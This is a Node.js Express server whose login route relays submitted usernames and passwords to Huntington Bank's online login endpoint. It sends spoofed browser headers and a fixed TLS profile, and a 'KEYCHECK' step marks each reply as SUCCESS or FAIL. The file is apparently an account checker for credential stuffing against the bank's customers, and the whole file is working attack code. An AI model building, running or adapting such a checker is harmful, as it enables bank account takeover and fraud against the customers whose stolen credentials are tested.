import express from "express";
import axios from "axios";
import https from "https";

const app = express();
app.use(express.json());

// ===============================
// HTTPS Agent — SECPROTO TLS12
// ===============================
const secureAgent = new https.Agent({
  keepAlive: true,
  minVersion: "TLSv1.2",
  maxVersion: "TLSv1.2",
  ciphers: [
    "ECDHE-RSA-AES256-GCM-SHA384",
    "ECDHE-RSA-AES128-GCM-SHA256",
    "ECDHE-ECDSA-AES256-GCM-SHA384",
    "ECDHE-ECDSA-AES128-GCM-SHA256"
  ].join(":"),
  honorCipherOrder: true,
  rejectUnauthorized: true
});

// ===============================
// Test Route
// ===============================
app.get("/", (req, res) => {
  res.send("API is running");
});

// ===============================
// Login Route
// ===============================
app.post("/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({
      success: false,
      error: "Missing username or password"
    });
  }

  try {
    const response = await axios.post(
      "https://digitallobby.huntington.com/pkmslogin.form",
      new URLSearchParams({
        username,
        password,
        "login-form-type": "pwd"
      }).toString(),
      {
        httpsAgent: secureAgent,
        proxy: false,

        headers: {
          "Host": "digitallobby.huntington.com",
          "Accept": "application/json, text/plain, */*",
          "Accept-Encoding": "gzip, deflate, br, zstd",
          "Accept-Language": "en-US,en;q=0.9",
          "Content-Type": "application/x-www-form-urlencoded",
          "Origin": "https://digitallobby.huntington.com",
          "Referer": "https://digitallobby.huntington.com/login",

          // User-Agent ثابت (بدون تعديل)
          "User-Agent":
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36"
        },

        timeout: 15000,
        validateStatus: () => true // نقرأ الريسبونس حتى لو status مش 200
      }
    );

    const body =
      typeof response.data === "string"
        ? response.data
        : JSON.stringify(response.data);

    // ===============================
    // KEYCHECK (زي ما بعته)
    // ===============================
    if (body.includes('"operation" : "login_success"') || body.includes('"operation":"login_success"')) {
      return res.json({
        success: true,
        status: "SUCCESS",
        response: body
      });
    }

    if (body.includes('"operation" : "login"') || body.includes('"operation":"login"')) {
      return res.json({
        success: false,
        status: "FAIL",
        response: body
      });
    }

    // ===============================
    // Unknown response (نطبع كله)
    // ===============================
    return res.json({
      success: false,
      status: "UNKNOWN_RESPONSE",
      response: body
    });

  } catch (err) {
    return res.status(500).json({
      success: false,
      error: err.message
    });
  }
});

// ===============================
// Start Server
// ===============================
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
